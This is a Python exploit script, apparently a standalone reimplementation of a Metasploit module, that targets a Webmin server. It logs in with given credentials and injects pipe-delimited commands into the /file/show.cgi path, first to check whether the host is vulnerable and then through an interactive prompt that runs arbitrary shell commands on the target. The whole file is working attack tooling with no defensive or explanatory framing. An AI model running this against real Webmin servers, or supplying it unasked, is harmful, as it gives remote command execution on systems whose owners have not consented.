#!/usr/bin/env python3

import argparse
import sys
import requests
from signal import signal, SIGINT
from re import sub
from string import ascii_letters, digits
from secrets import choice


def signalHandler(sig, frame):
    print("\n[*] Exiting...")
    sys.exit(0)


class Exploit():
    def __init__(self):
        self.session = requests.session()
        self.session.cookies.set("testing", "1")


    def argparser(self):
        parser = argparse.ArgumentParser(description="Webmin backdoor metasploit reimplementation")
        parser.add_argument("host", help="The target")
        parser.add_argument("port", type=int, default=10000, help="Target Port (default 10000)")
        parser.add_argument("username", help="Webmin Username")
        parser.add_argument("password", help="Webmin Password")
        self.args = parser.parse_args()

        self.args.host = sub(":\d+$", "", self.args.host)
        if "http://" in self.args.host:
            self.target = f"{self.args.host}:{self.args.port}"
        else:
            self.target = f"http://{self.args.host}:{self.args.port}"


    def rand_string(self):
        alphaNum = ascii_letters + digits
        return "".join([choice(alphaNum) for i in range(5)])

    def auth(self):
        payload = {
            "page": "/",
            "user": self.args.username,
            "pass": self.args.password
        }
        login = self.session.post(f"{self.target}/session_login.cgi", data=payload, allow_redirects=False)
        if login.status_code == 302:
            print(f"{self.target} - Successfully Authenticated")
        else:
            print(f"{self.target} - Invalid Credentials")
            sys.exit(0)


    def checkexploit(self):
        nonce = self.rand_string()
        payload = f"/file/show.cgi/bin/{self.rand_string()}|echo '{nonce}'|"
        check = self.session.get(f"{self.target}{payload}")
        if nonce not in check.text:
            print("Host is not vulnerable")
            sys.exit(0)


    def exploit(self):
        prompt = "Webmin >> "
        while 1:
            cmd = input(prompt)
            if cmd:
                payload = f"/file/show.cgi/bin.{self.rand_string()}|{cmd}|"
                print(self.session.get(f"{self.target}{payload}").text.strip("\n"))


if __name__ == "__main__":
    signal(SIGINT, signalHandler)
    exploit = Exploit()
    exploit.argparser()
    exploit.auth()
    exploit.checkexploit()
    exploit.exploit()
